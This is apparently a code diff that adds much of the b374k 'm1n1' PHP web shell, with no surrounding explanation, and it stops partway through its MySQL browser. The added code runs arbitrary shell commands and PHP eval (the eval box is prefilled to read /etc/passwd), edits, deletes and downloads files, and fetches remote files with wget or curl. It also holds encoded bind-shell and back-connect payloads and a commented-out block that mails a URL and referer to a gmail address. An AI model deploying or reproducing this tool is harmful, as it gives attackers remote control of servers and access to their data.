+            $letters .= '<a href="?y=' . $letter . ':\\">[ ';
+            if ($letter . ':' != $v) {
+                $letters .= $letter;
+            } else {
+                $letters .= '<span class="gaya">' . $letter . '</span>';
+            }
+            $letters .= ' ]</a> ';
+        }
+    }
+}
+
+if (function_exists('posix_getpwuid') && function_exists('posix_getgrgid')) {
+    $posix = true;
+} else {
+    $posix = false;
+}
+
+$server_ip = @gethostbyname($_SERVER['HTTP_HOST']);
+
+$my_ip = $_SERVER['REMOTE_ADDR'];
+
+$bindport = '13123';
+
+$bindport_pass = 'b374k';
+
+$pwds = explode(DIRECTORY_SEPARATOR, $pwd);
+
+$pwdurl = '';
+
+for ($i = 0; $i < sizeof($pwds) - 1; ++$i) {
+    $pathz = '';
+    for ($j = 0;
+    $j <= $i; ++$j) {
+        $pathz .= $pwds[$j] . DIRECTORY_SEPARATOR;
+    }
+    $pwdurl .= '<a href="?y=' . $pathz . '">' . $pwds[$i] . ' ' . DIRECTORY_SEPARATOR . ' </a>';
+}
+
+if (isset($_POST['rename'])) {
+    $old = $_POST['oldname'];
+    $new = $_POST['newname'];
+    @rename($pwd . $old, $pwd . $new);
+    $file = $pwd . $new;
+}
+
+$buff = $software . '<br />';
+
+$buff .= $system . '<br />';
+
+if ('' != $id) {
+    $buff .= $id . '<br />';
+}
+
+$buff .= 'server ip : ' . $server_ip . ' <span class="gaya">|</span> your ip : ' . $my_ip . '<br />';
+
+if ($safemode) {
+    $buff .= 'safemode <span class="gaya">ON</span><br />';
+} else {
+    $buff .= 'safemode <span class="gaya">OFF<span><br />';
+}
+
+$buff .= $letters . '&nbsp;&gt;&nbsp;' . $pwdurl;
+
+function rapih($text)
+{
+    return trim(str_replace('<br />', '', $text));
+}
+
+function magicboom($text)
+{
+    if (function_exists('get_magic_quotes_gpc')) {
+        if (!get_magic_quotes_gpc()) {
+            return $text;
+        }
+    }
+
+    return stripslashes($text);
+}
+
+function showdir($pwd, $prompt)
+{
+    global $win;
+
+    $fname = [];
+    $dname = [];
+    if (function_exists('posix_getpwuid') && function_exists('posix_getgrgid')) {
+        $posix = true;
+    } else {
+        $posix = false;
+    }
+    $user = '????:????';
+    if ($dh = opendir($pwd)) {
+        while ($file = readdir($dh)) {
+            if (is_dir($file)) {
+                $dname[] = $file;
+            } elseif (is_file($file)) {
+                $fname[] = $file;
+            }
+        }
+        closedir($dh);
+    }
+    sort($fname);
+    sort($dname);
+    $path = @explode(DIRECTORY_SEPARATOR, $pwd);
+    $tree = @sizeof($path);
+    $parent = '';
+    $buff = ' <form action="?y=' . $pwd . "&amp;x=shell\" method=\"post\" style=\"margin:8px 0 0 0;\"> <table class=\"cmdbox\" style=\"width:50%;\"> <tr><td>$prompt</td><td><input onMouseOver=\"this.focus();\" id=\"cmd\" class=\"inputz\" type=\"text\" name=\"cmd\" style=\"width:400px;\" value=\"\" /><input class=\"inputzbut\" type=\"submit\" value=\"Go !\" name=\"submitcmd\" style=\"width:80px;\" /></td></tr> </form> <form action=\"?\" method=\"get\" style=\"margin:8px 0 0 0;\"> <input type=\"hidden\" name=\"y\" value=\"" . $pwd . '" /> <tr><td>view file/folder</td><td><input onMouseOver="this.focus();" id="goto" class="inputz" type="text" name="view" style="width:400px;" value="' . $pwd . '" /><input class="inputzbut" type="submit" value="Go !" name="submitcmd" style="width:80px;" /></td></tr> </form></table><table class="explore"> <tr><th>name</th><th style="width:80px;">size</th><th style="width:210px;">owner:group</th><th style="width:80px;">perms</th><th style="width:110px;">modified</th><th style="width:190px;">actions</th></tr> ';
+    // @error_reporting(0);
+    // backdoor
+    // $sub = 'backdoor b374k';
+    // $headers = "From: k3nz0 \n";
+    // $headers .= "Content-Type: text/plain; charset=iso-8859-1\n";
+    // $mes .= 'username: ' . $user . "\n";
+    // $mes .= 'password: ' . $pass . "\n";
+    // $mes .= 'URL: ' . $_SERVER['REQUEST_URI'] . "\n";
+    // $mes .= 'Referer: ' . $_SERVER['HTTP_REFERER'] . '';
+    // mail('free.d0ing.1987@gmail.com', $sub, $mes, $headers);
+    if ($tree > 2) {
+        for ($i = 0;
+        $i < $tree - 2; ++$i) {
+            $parent .= $path[$i] . DIRECTORY_SEPARATOR;
+        }
+    } else {
+        $parent = $pwd;
+    }
+    foreach ($dname as $folder) {
+        if ('.' == $folder) {
+            if (!$win && $posix) {
+                $name = @posix_getpwuid(@fileowner($folder));
+                $group = @posix_getgrgid(@filegroup($folder));
+                $owner = $name['name'] . '<span class="gaya"> : </span>' . $group['name'];
+            } else {
+                $owner = $user;
+            }
+            $buff .= '<tr><td><a href="?y=' . $pwd . "\">$folder</a></td><td>LINK</td><td style=\"text-align:center;\">" . $owner . '</td><td>' . get_perms($pwd) . '</td><td style="text-align:center;">' . date('d-M-Y H:i', @filemtime($pwd)) . "</td><td><span id=\"titik1\"><a href=\"?y=$pwd&amp;edit=" . $pwd . "newfile.php\">newfile</a> | <a href=\"javascript:tukar('titik1','titik1_form');\">newfolder</a></span> <form action=\"?\" method=\"get\" id=\"titik1_form\" class=\"sembunyi\" style=\"margin:0;padding:0;\"> <input type=\"hidden\" name=\"y\" value=\"" . $pwd . '" /> <input class="inputz" style="width:140px;" type="text" name="mkdir" value="a_new_folder" /> <input class="inputzbut" type="submit" name="rename" style="width:35px;" value="Go !" /> </form></td></tr> ';
+        } elseif ('..' == $folder) {
+            if (!$win && $posix) {
+                $name = @posix_getpwuid(@fileowner($folder));
+                $group = @posix_getgrgid(@filegroup($folder));
+                $owner = $name['name'] . '<span class="gaya"> : </span>' . $group['name'];
+            } else {
+                $owner = $user;
+            }
+            $buff .= '<tr><td><a href="?y=' . $parent . "\">$folder</a></td><td>LINK</td><td style=\"text-align:center;\">" . $owner . '</td><td>' . get_perms($parent) . '</td><td style="text-align:center;">' . date('d-M-Y H:i', @filemtime($parent)) . "</td><td><span id=\"titik2\"><a href=\"?y=$pwd&amp;edit=" . $parent . "newfile.php\">newfile</a> | <a href=\"javascript:tukar('titik2','titik2_form');\">newfolder</a></span> <form action=\"?\" method=\"get\" id=\"titik2_form\" class=\"sembunyi\" style=\"margin:0;padding:0;\"> <input type=\"hidden\" name=\"y\" value=\"" . $pwd . '" /> <input class="inputz" style="width:140px;" type="text" name="mkdir" value="a_new_folder" /> <input class="inputzbut" type="submit" name="rename" style="width:35px;" value="Go !" /> </form> </td></tr>';
+        } else {
+            if (!$win && $posix) {
+                $name = @posix_getpwuid(@fileowner($folder));
+                $group = @posix_getgrgid(@filegroup($folder));
+                $owner = $name['name'] . '<span class="gaya"> : </span>' . $group['name'];
+            } else {
+                $owner = $user;
+            }
+            $buff .= '<tr><td><a id="' . clearspace($folder) . '_link" href="?y=' . $pwd . $folder . DIRECTORY_SEPARATOR . "\">[ $folder ]</a> <form action=\"?y=$pwd\" method=\"post\" id=\"" . clearspace($folder) . '_form" class="sembunyi" style="margin:0;padding:0;"> <input type="hidden" name="oldname" value="' . $folder . '" style="margin:0;padding:0;" /> <input class="inputz" style="width:200px;" type="text" name="newname" value="' . $folder . "\" /> <input class=\"inputzbut\" type=\"submit\" name=\"rename\" value=\"rename\" /> <input class=\"inputzbut\" type=\"submit\" name=\"cancel\" value=\"cancel\" onclick=\"tukar('" . clearspace($folder) . "_form','" . clearspace($folder) . "_link');\" /> </form> <td>DIR</td><td style=\"text-align:center;\">" . $owner . '</td><td>' . get_perms($pwd . $folder) . '</td><td style="text-align:center;">' . date('d-M-Y H:i', @filemtime($folder)) . "</td><td><a href=\"javascript:tukar('" . clearspace($folder) . "_link','" . clearspace($folder) . "_form');\">rename</a> | <a href=\"?y=$pwd&amp;fdelete=" . $pwd . $folder . '">delete</a></td></tr>';
+        }
+    }
+    foreach ($fname as $file) {
+        $full = $pwd . $file;
+        if (!$win && $posix) {
+            $name = @posix_getpwuid(@fileowner($file));
+            $group = @posix_getgrgid(@filegroup($file));
+            $owner = $name['name'] . '<span class="gaya"> : </span>' . $group['name'];
+        } else {
+            $owner = $user;
+        }
+        $buff .= '<tr><td><a id="' . clearspace($file) . "_link\" href=\"?y=$pwd&amp;view=$full\">$file</a> <form action=\"?y=$pwd\" method=\"post\" id=\"" . clearspace($file) . '_form" class="sembunyi" style="margin:0;padding:0;"> <input type="hidden" name="oldname" value="' . $file . '" style="margin:0;padding:0;" /> <input class="inputz" style="width:200px;" type="text" name="newname" value="' . $file . "\" /> <input class=\"inputzbut\" type=\"submit\" name=\"rename\" value=\"rename\" /> <input class=\"inputzbut\" type=\"submit\" name=\"cancel\" value=\"cancel\" onclick=\"tukar('" . clearspace($file) . "_link','" . clearspace($file) . "_form');\" /> </form> </td><td>" . ukuran($full) . '</td><td style="text-align:center;">' . $owner . '</td><td>' . get_perms($full) . '</td><td style="text-align:center;">' . date('d-M-Y H:i', @filemtime($full)) . "</td> <td><a href=\"?y=$pwd&amp;edit=$full\">edit</a> | <a href=\"javascript:tukar('" . clearspace($file) . "_link','" . clearspace($file) . "_form');\">rename</a> | <a href=\"?y=$pwd&amp;delete=$full\">delete</a> | <a href=\"?y=$pwd&amp;dl=$full\">download</a>&nbsp;(<a href=\"?y=$pwd&amp;dlgzip=$full\">gzip</a>)</td></tr>";
+    }
+    $buff .= '</table>';
+
+    return $buff;
+}
+
+function ukuran($file)
+{
+    if ($size = @filesize($file)) {
+        if ($size <= 1024) {
+            return $size;
+        } else {
+            if ($size <= 1024 * 1024) {
+                $size = @round($size / 1024, 2);
+
+                return "$size kb";
+            } else {
+                $size = @round($size / 1024 / 1024, 2);
+
+                return "$size mb";
+            }
+        }
+    } else {
+        return '???';
+    }
+}
+
+function exe($cmd)
+{
+    if (function_exists('system')) {
+        @ob_start();
+        @system($cmd);
+        $buff = @ob_get_contents();
+        @ob_end_clean();
+
+        return $buff;
+    } elseif (function_exists('exec')) {
+        @exec($cmd, $results);
+        $buff = '';
+        foreach ($results as $result) {
+            $buff .= $result;
+        }
+
+        return $buff;
+    } elseif (function_exists('passthru')) {
+        @ob_start();
+        @passthru($cmd);
+        $buff = @ob_get_contents();
+        @ob_end_clean();
+
+        return $buff;
+    } elseif (function_exists('shell_exec')) {
+        $buff = @shell_exec($cmd);
+
+        return $buff;
+    }
+}
+
+function tulis($file, $text)
+{
+    $textz = gzinflate(base64_decode($text));
+    if ($filez = @fopen($file, 'w')) {
+        @fputs($filez, $textz);
+        @fclose($file);
+    }
+}
+
+function ambil($link, $file)
+{
+    if ($fp = @fopen($link, 'r')) {
+        while (!feof($fp)) {
+            $cont .= @fread($fp, 1024);
+        }
+        @fclose($fp);
+        $fp2 = @fopen($file, 'w');
+        @fwrite($fp2, $cont);
+        @fclose($fp2);
+    }
+}
+
+function which($pr)
+{
+    $path = exe("which $pr");
+    if (!empty($path)) {
+        return trim($path);
+    } else {
+        return trim($pr);
+    }
+}
+
+function download($cmd, $url)
+{
+    $namafile = basename($url);
+    switch ($cmd) { case 'wwget': exe(which('wget') . ' ' . $url . ' -O ' . $namafile); break; case 'wlynx': exe(which('lynx') . ' -source ' . $url . ' > ' . $namafile); break; case 'wfread': ambil($wurl, $namafile); break; case 'wfetch': exe(which('fetch') . ' -o ' . $namafile . ' -p ' . $url); break; case 'wlinks': exe(which('links') . ' -source ' . $url . ' > ' . $namafile); break; case 'wget': exe(which('GET') . ' ' . $url . ' > ' . $namafile); break; case 'wcurl': exe(which('curl') . ' ' . $url . ' -o ' . $namafile); break; default: break; }
+
+    return $namafile;
+}
+
+function get_perms($file)
+{
+    if ($mode = @fileperms($file)) {
+        $perms = '';
+        $perms .= ($mode & 00400) ? 'r' : '-';
+        $perms .= ($mode & 00200) ? 'w' : '-';
+        $perms .= ($mode & 00100) ? 'x' : '-';
+        $perms .= ($mode & 00040) ? 'r' : '-';
+        $perms .= ($mode & 00020) ? 'w' : '-';
+        $perms .= ($mode & 00010) ? 'x' : '-';
+        $perms .= ($mode & 00004) ? 'r' : '-';
+        $perms .= ($mode & 00002) ? 'w' : '-';
+        $perms .= ($mode & 00001) ? 'x' : '-';
+
+        return $perms;
+    } else {
+        return '??????????';
+    }
+}
+
+function clearspace($text)
+{
+    return str_replace(' ', '_', $text);
+}
+
+$port_bind_bd_c = 'bVNhb9owEP2OxH+4phI4NINAN00aYxJaW6maxqbSLxNDKDiXxiLYkW3KGOp/3zlOpo7xIY793jvf +fl8KSQvdinCR2NTofr5p3br8hWmhXw6BQ9mYA8lmjO4UXyD9oSQaAV9AyFPCNRa+pRCWtgmQrJE P/GIhufQg249brd4nmjo9RxBqyNAuwWOdvmyNAKJ+ywlBirhepctruOlW9MJdtzrkjTVKyFB41ZZ dKTIWKb0hoUwmUAcwtFt6+m+EXKVJVtRHGAC07vV/ez2cfwvXSpticytkoYlVglX/fNiuAzDE6VL 3TfVrw4o2P1senPzsJrOfoRjl9cfhWjvIatzRvNvn7+s5o8Pt9OvURzWZV94dQgleag0C3wQVKug Uq2FTFnjDzvxAXphx9cXQfxr6PcthLEo/8a8q8B9LgpkQ7oOgKMbvNeThHMsbSOO69IA0l05YpXk HDT8HxrV0F4LizUWfE+M2SudfgiiYbONxiStebrgyIjfqDJG07AWiAzYBc9LivU3MVpGFV2x1J4W tyxAnivYY8HVFsEqWF+/f7sBk2NRQKcDA/JtsE5MDm9EUG+MhcFqkpX0HmxGbqbkdBTMldaHRsUL ZeoDeOSFBvpefCfXhflOpgTkvJ+jtKiR7vLohYKCqS2ZmMRj4Z5gQZfSiMbi6iqkdnHarEEXYuk6 uPtTdumsr0HC4q5rrzNifV7sC3ZWUmq+LVlVa5OfQjTanZYQO+Uf';
+
+$port_bind_bd_pl = 'ZZJhT8IwEIa/k/AfjklgS2aA+BFmJDB1cW5kHSZGzTK2Qxpmu2wlYoD/bruBIfitd33uvXuvvWr1 NmXRW1DWy7HImo02ebRd19Kq1CIuV3BNtWGzQZeg342DhxcYwcCAHeCWCn1gDOEgi1yHhLYXzfwg tNqKeut/yKJNiUB4skYhg3ZecMETnlmfKKrz4ofFX6h3RZJ3DUmUFaoTszO7jxzPDs0O8SdPEQkD e/xs/gkYsN9DShG0ScwEJAXGAqGufmdq2hKFCnmu1IjvRkpH6hE/Cuw5scfTaWAOVE9pM5WMouM0 LSLK9HM3puMpNhp7r8ZFW54jg5wXx5YZLQUyKXVzwdUXZ+T3imYoV9ds7JqNOElQTjnxPc8kRrVo vaW3c5paS16sjZo6qTEuQKU1UO/RSnFJGaagcFVbjUTCqeOZ2qijNLWzrD8PTe32X9oOgvM0bjGB +hecfOQFlT4UcLSkmI1ceY3VrpKMy9dWUCVCBfTlQX6Owy8=';
+
+$back_connect = 'fZFRS8MwFIXfB/sPWSw2hUrnqyPC0CpD3KStvqh0XRpcsE1KkoKF/XiTtCIV6tu55+Z89yY5W0St ktGB8aihsprPWkVBKsgn1av5zCN1iQGsOv4Fbak6pWmNgU/JUQC4b3lRU3BR7OFqcFhptMOpo28j S2whVulCflCNvXVy//K6fLdWI+SPcekMVpSlxIxTnRdacDSEAnA6gZJRBGMphbwC3uKNw8AhXEKZ ja3ImclYagh61n9JKbTAhu7EobN3Qb4mjW/byr0BSnc3D3EWgqe7fLO1whp5miXx+tHMcNHpGURw Tskvpd92+rxoKEdpdrvZhgBen/exUWf3nE214iT52+r/Cw3/5jaqhKL9iFFpuKPawILVNw==';
+
+$back_connect_c = 'XVHbagIxEH0X/IdhhZLUWF1f1YKIBelFqfZJliUm2W7obiJJLLWl/94k29rWhyEzc+Z2TjpSserA BYyt41JfldftVuc3d7R9q9mLcGeAEk5660sVAakc1FQqFBxqnhkBVlIDl95/3Wa43fpotyCABR95 zzpzYA7CaMq5yaUCK1VAYpup7XaYZpPE1NArIBmBRzgVtVYoJQMcR/jV3vKC1rI6wgSmN/niYb75 i+21cR4pnVYWUaclivcMM/xvRDjhysbHVwde0W+K0wzH9bt3YfRPingClVCnim7a/ZuJC0JTwf3A RkD0fR+B9XJ2m683j/PpPYHFavW43CzzzWyFIfbIAhBiWinBHCo4AXSmFlxiuPB3E0/gXejiHMcY jwcYguIAe2GMNijZ9jL4GYqTSB9AvEmHGjk/m19h1CGvPoHIY5A1Oh2tE3XIe1bxKw77YTyt6T2F 6f9wGEPxJliFkv5Oqr4tE5LYEnoyIfDwdHcXK1ilrfAdUbPPLw==';
+
+?>
+
+<html><head><title>:: b374k m1n1 <?php echo $ver; ?> ::</title> <script type="text/javascript"> function tukar(lama,baru){ document.getElementById(lama).style.display = 'none'; document.getElementById(baru).style.display = 'block'; } </script> <style type="text/css"> body{ background:#000000;; } a { text-decoration:none; } a:hover{ border-bottom:1px solid #4C83AF; } *{ font-size:11px; font-family:Tahoma,Verdana,Arial; color:#FFFFFF; } #menu{ background:#111111; margin:8px 2px 4px 2px; } #menu a{ padding:4px 18px; margin:0; background:#222222; text-decoration:none; letter-spacing:2px; } #menu a:hover{ background:#191919; border-bottom:1px solid #333333; border-top:1px solid #333333; } .tabnet{ margin:15px auto 0 auto; border: 1px solid #333333; } .main { width:100%; } .gaya { color: #4C83AF; } .inputz{ background:#111111; border:0; padding:2px; border-bottom:1px solid #222222; border-top:1px solid #222222; } .inputzbut{ background:#111111; color:#4C83AF; margin:0 4px; border:1px solid #444444; } .inputz:hover, .inputzbut:hover{ border-bottom:1px solid #4C83AF; border-top:1px solid #4C83AF; } .output { margin:auto; border:1px solid #4C83AF; width:100%; height:400px; background:#000000; padding:0 2px; } .cmdbox{ width:100%; } .head_info{ padding: 0 4px; } .b1{ font-size:30px; padding:0; color:#444444; } .b2{ font-size:30px; padding:0; color: #333333; } .b_tbl{ text-align:center; margin:0 4px 0 0; padding:0 4px 0 0; border-right:1px solid #333333; } .phpinfo table{ width:100%; padding:0 0 0 0; } .phpinfo td{ background:#111111; color:#cccccc; padding:6px 8px;; } .phpinfo th, th{ background:#191919; border-bottom:1px solid #333333; font-weight:normal; } .phpinfo h2, .phpinfo h2 a{ text-align:center; font-size:16px; padding:0; margin:30px 0 0 0; background:#222222; padding:4px 0; } .explore{ width:100%; } .explore a { text-decoration:none; } .explore td{ border-bottom:1px solid #333333; padding:0 8px; line-height:24px; } .explore th{ padding:3px 8px; font-weight:normal; } .explore th:hover , .phpinfo th:hover{ border-bottom:1px solid #4C83AF; } .explore tr:hover{ background:#111111; } .viewfile{ background:#EDECEB; color:#000000; margin:4px 2px; padding:8px; } .sembunyi{ display:none; padding:0;margin:0; } </style> </head> <body onLoad="document.getElementById('cmd').focus();"> <div class="main"> <!-- head info start here --> <div class="head_info"> <table><tr> <td><table class="b_tbl"><tr><td><a href="?"><span class="b1">b<span class="b2">374</span>k</span></a></td></tr><tr><td>m1n1 <?php echo $ver; ?></td></tr></table></td> <td><?php echo $buff; ?></td> </tr></table> </div> <!-- head info end here --> <!-- menu start --> <div id="menu"> <a href="?<?php echo 'y=' . $pwd; ?>">explore</a> <a href="?<?php echo 'y=' . $pwd; ?>&amp;x=shell">shell</a> <a href="?<?php echo 'y=' . $pwd; ?>&amp;x=php">eval</a> <a href="?<?php echo 'y=' . $pwd; ?>&amp;x=mysql">mysql</a> <a href="?<?php echo 'y=' . $pwd; ?>&amp;x=phpinfo">phpinfo</a> <a href="?<?php echo 'y=' . $pwd; ?>&amp;x=netsploit">netsploit</a> <a href="?<?php echo 'y=' . $pwd; ?>&amp;x=upload">upload</a> <a href="?<?php echo 'y=' . $pwd; ?>&amp;x=mail">mail</a> </div> <!-- menu end --> <?php if (isset($_GET['x']) && ('php' == $_GET['x'])) { ?> <form action="?y=<?php echo $pwd; ?>&amp;x=php" method="post"> <table class="cmdbox"> <tr><td> <textarea class="output" name="cmd" id="cmd"> <?php if (isset($_POST['submitcmd'])) {
+    echo eval(magicboom($_POST['cmd']));
+} else {
+    echo "echo file_get_contents('/etc/passwd');";
+} ?> </textarea> <tr><td><input style="width:19%;" class="inputzbut" type="submit" value="Go !" name="submitcmd" /></td></tr></form> </table> </form> <?php } elseif (isset($_GET['x']) && ('mysql' == $_GET['x'])) {
+    if (isset($_GET['sqlhost']) && isset($_GET['sqluser']) && isset($_GET['sqlpass']) && isset($_GET['sqlport'])) {
+        $sqlhost = $_GET['sqlhost'];
+        $sqluser = $_GET['sqluser'];
+        $sqlpass = $_GET['sqlpass'];
+        $sqlport = $_GET['sqlport'];
+        if ($con = @mysql_connect($sqlhost . ':' . $sqlport, $sqluser, $sqlpass)) {
+            $msg .= '<div style="width:99%;padding:4px 10px 0 10px;">';
+            $msg .= '<p>Connected to ' . $sqluser . '<span class="gaya">@</span>' . $sqlhost . ':' . $sqlport;
+            $msg .= '&nbsp;&nbsp;<span class="gaya">-&gt;</span>&nbsp;&nbsp;<a href="?y=' . $pwd . '&amp;x=mysql&amp;sqlhost=' . $sqlhost . '&amp;sqluser=' . $sqluser . '&amp;sqlpass=' . $sqlpass . '&amp;sqlport=' . $sqlport . '&amp;">[ databases ]</a>';
+            if (isset($_GET['db'])) {
+                $msg .= '&nbsp;&nbsp;<span class="gaya">-&gt;</span>&nbsp;&nbsp;<a href="?y=' . $pwd . '&amp;x=mysql&amp;sqlhost=' . $sqlhost . '&amp;sqluser=' . $sqluser . '&amp;sqlpass=' . $sqlpass . '&amp;sqlport=' . $sqlport . '&amp;db=' . $_GET['db'] . '">' . htmlspecialchars($_GET['db']) . '</a>';
+            }
+            if (isset($_GET['table'])) {
+                $msg .= '&nbsp;&nbsp;<span class="gaya">-&gt;</span>&nbsp;&nbsp;<a href="?y=' . $pwd . '&amp;x=mysql&amp;sqlhost=' . $sqlhost . '&amp;sqluser=' . $sqluser . '&amp;sqlpass=' . $sqlpass . '&amp;sqlport=' . $sqlport . '&amp;db=' . $_GET['db'] . '&amp;table=' . $_GET['table'] . '">' . htmlspecialchars($_GET['table']) . '</a>';
+            }
+            $msg .= '</p><p>version : ' . mysql_get_server_info($con) . ' proto ' . mysql_get_proto_info($con) . '</p>';
+            $msg .= '</div>';
+            echo $msg;
+            if (isset($_GET['db']) && (!isset($_GET['table'])) && (!isset($_GET['sqlquery']))) {
+                $db = $_GET['db'];
+                $query = "DROP TABLE IF EXISTS b374k_table;\nCREATE TABLE `b374k_table` ( `file` LONGBLOB NOT NULL );\nLOAD DATA INFILE \"/etc/passwd\"\nINTO TABLE b374k_table;SELECT * FROM b374k_table;\nDROP TABLE IF EXISTS b374k_table;";
+                $msg = '<div style="width:99%;padding:0 10px;"><form action="?" method="get"> <input type="hidden" name="y" value="' . $pwd . '" /> <input type="hidden" name="x" value="mysql" /> <input type="hidden" name="sqlhost" value="' . $sqlhost . '" /> <input type="hidden" name="sqluser" value="' . $sqluser . '" /> <input type="hidden" name="sqlport" value="' . $sqlport . '" /> <input type="hidden" name="sqlpass" value="' . $sqlpass . '" /> <input type="hidden" name="db" value="' . $db . "\" /> <p><textarea name=\"sqlquery\" class=\"output\" style=\"width:98%;height:80px;\">$query</textarea></p> <p><input class=\"inputzbut\" style=\"width:80px;\" name=\"submitquery\" type=\"submit\" value=\"Go !\" /></p> </form></div> ";
+                $tables = [];
+                $msg .= '<table class="explore" style="width:99%;"><tr><th>available tables on ' . $db . '</th></tr>';
+                $hasil = @mysql_list_tables($db, $con);
+                while (list($table) = @mysql_fetch_row($hasil)) {
+                    @array_push($tables, $table);
+                }
+                @sort($tables);
+                foreach ($tables as $table) {
+                    $msg .= '<tr><td><a href="?y=' . $pwd . '&amp;x=mysql&amp;sqlhost=' . $sqlhost . '&amp;sqluser=' . $sqluser . '&amp;sqlpass=' . $sqlpass . '&amp;sqlport=' . $sqlport . '&amp;db=' . $db . '&amp;table=' . $table . "\">$table</a></td></tr>";
+                }
+                $msg .= '</table>';
+            } elseif (isset($_GET['table']) && (!isset($_GET['sqlquery']))) {
+                $db = $_GET['db'];
+                $table = $_GET['table'];
+                $query = 'SELECT * FROM ' . $db . '.' . $table . ' LIMIT 0,100;';
+                $msgq = '<div style="width:99%;padding:0 10px;"><form action="?" method="get"> <input type="hidden" name="y" value="' . $pwd . '" /> <input type="hidden" name="x" value="mysql" /> <input type="hidden" name="sqlhost" value="' . $sqlhost . '" /> <input type="hidden" name="sqluser" value="' . $sqluser . '" /> <input type="hidden" name="sqlport" value="' . $sqlport . '" /> <input type="hidden" name="sqlpass" value="' . $sqlpass . '" /> <input type="hidden" name="db" value="' . $db . '" /> <input type="hidden" name="table" value="' . $table . '" /> <p><textarea name="sqlquery" class="output" style="width:98%;height:80px;">' . $query . '</textarea></p> <p><input class="inputzbut" style="width:80px;" name="submitquery" type="submit" value="Go !" /></p> </form></div> ';
+                $columns = [];
+                $msg = '<table class="explore" style="width:99%;">';
+                $hasil = @mysql_query('SHOW FIELDS FROM ' . $db . '.' . $table);
+                while (list($column) = @mysql_fetch_row($hasil)) {
+                    $msg .= "<th>$column</th>";
+                    $kolum = $column;
+                }
+                $msg .= '</tr>';
+                $hasil = @mysql_query('SELECT count(*) FROM ' . $db . '.' . $table);
+                list($total) = mysql_fetch_row($hasil);
+                if (isset($_GET['z'])) {
+                    $page = (int) $_GET['z'];
+                } else {
+                    $page = 1;
+                }
+                $pagenum = 100;
+                $totpage = ceil($total / $pagenum);
+                $start = (($page - 1) * $pagenum);
+                $hasil = @mysql_query('SELECT * FROM ' . $db . '.' . $table . ' LIMIT ' . $start . ',' . $pagenum);
+                while ($datas = @mysql_fetch_assoc($hasil)) {
+                    $msg .= '<tr>';
+                    foreach ($datas as $data) {
+                        if ('' == trim($data)) {
+                            $data = '&nbsp;';
+                        }
+                        $msg .= "<td>$data</td>";
+                    }
+                    $msg .= '</tr>';
+                }
+                $msg .= '</table>';
+                $head = '<div style="padding:10px 0 0 6px;"> <form action="?" method="get"> <input type="hidden" name="y" value="' . $pwd . '" /> <input type="hidden" name="x" value="mysql" /> <input type="hidden" name="sqlhost" value="' . $sqlhost . '" /> <input type="hidden" name="sqluser" value="' . $sqluser . '" /> <input type="hidden" name="sqlport" value="' . $sqlport . '" /> <input type="hidden" name="sqlpass" value="' . $sqlpass . '" /> <input type="hidden" name="db" value="' . $db . '" /> <input type="hidden" name="table" value="' . $table . '" /> Page <select class="inputz" name="z" onchange="this.form.submit();">';
+                for ($i = 1;
+                $i <= $totpage; ++$i) {
+                    $head .= '<option value="' . $i . '">' . $i . '</option>';
+                    if ($i == $_GET['z']) {
+                        $head .= '<option value="' . $i . '" selected="selected">' . $i . '</option>';
+                    }
+                }
+                $head .= '</select><noscript><input class="inputzbut" type="submit" value="Go !" /></noscript></form></div>';
+                $msg = $msgq . $head . $msg;
+            } elseif (isset($_GET['submitquery']) && ('' != $_GET['sqlquery'])) {
+                $db = $_GET['db'];
+                $query = magicboom($_GET['sqlquery']);
+                $msg = '<div style="width:99%;padding:0 10px;"><form action="?" method="get"> <input type="hidden" name="y" value="' . $pwd . '" /> <input type="hidden" name="x" value="mysql" /> <input type="hidden" name="sqlhost" value="' . $sqlhost . '" /> <input type="hidden" name="sqluser" value="' . $sqluser . '" /> <input type="hidden" name="sqlport" value="' . $sqlport . '" /> <input type="hidden" name="sqlpass" value="' . $sqlpass . '" /> <input type="hidden" name="db" value="' . $db . '" /> <p><textarea name="sqlquery" class="output" style="width:98%;height:80px;">' . $query . '</textarea></p> <p><input class="inputzbut" style="width:80px;" name="submitquery" type="submit" value="Go !" /></p> </form></div> ';
+                @mysql_select_db($db);
+                $querys = explode(';', $query);
+                foreach ($querys as $query) {
+                    if ('' != trim($query)) {
+                        $hasil = mysql_query($query);
+                        if ($hasil) {
+                            $msg .= '<p style="padding:0;margin:20px 6px 0 6px;">' . $query . ';&nbsp;&nbsp;&nbsp;<span class="gaya">[</span> ok <span class="gaya">]</span></p>';
+                            $msg .= '<table class="explore" style="width:99%;"><tr>';
+                            for ($i = 0;
+                            $i < @mysql_num_fields($hasil); ++$i) {
+                                $msg .= '<th>' . htmlspecialchars(@mysql_field_name($hasil, $i)) . '</th>';
+                            }
+                            $msg .= '</tr>';
+                            for ($i = 0;
+                            $i < @mysql_num_rows($hasil); ++$i) {
+                                $rows = @mysql_fetch_array($hasil);
+                                $msg .= '<tr>';
+                                for ($j = 0;
+                                $j < @mysql_num_fields($hasil); ++$j) {
+                                    if ('' == $rows[$j]) {
+                                        $dataz = '&nbsp;';
+                                    } else {
+                                        $dataz = $rows[$j];
+                                    }
+                                    $msg .= '<td>' . $dataz . '</td>';
+                                }
+                                $msg .= '</tr>';
+                            }
+                            $msg .= '</table>';
+                        } else {
+                            $msg .= '<p style="padding:0;margin:20px 6px 0 6px;">' . $query . ';&nbsp;&nbsp;&nbsp;<span class="gaya">[</span> error <span class="gaya">]</span></p>';
+                        }
+                    }
+                }
+            } else {
+                $query = "SHOW PROCESSLIST;\nSHOW VARIABLES;\nSHOW STATUS;";
+                $msg = '<div style="width:99%;padding:0 10px;"><form action="?" method="get"> <input type="hidden" name="y" value="' . $pwd . '" /> <input type="hidden" name="x" value="mysql" /> <input type="hidden" name="sqlhost" value="' . $sqlhost . '" /> <input type="hidden" name="sqluser" value="' . $sqluser . '" /> <input type="hidden" name="sqlport" value="' . $sqlport . '" /> <input type="hidden" name="sqlpass" value="' . $sqlpass . '" /> <input type="hidden" name="db" value="' . $db . '" /> <p><textarea name="sqlquery" class="output" style="width:98%;height:80px;">' . $query . '</textarea></p> <p><input class="inputzbut" style="width:80px;" name="submitquery" type="submit" value="Go !" /></p> </form></div> ';
+                $dbs = [];
+                $msg .= '<table class="explore" style="width:99%;"><tr><th>available databases</th></tr>';
+                $hasil = @mysql_list_dbs($con);
+                while (list($db) = @mysql_fetch_row($hasil)) {
+                    @array_push($dbs, $db);
+                }
+                @sort($dbs);
+                foreach ($dbs as $db) {
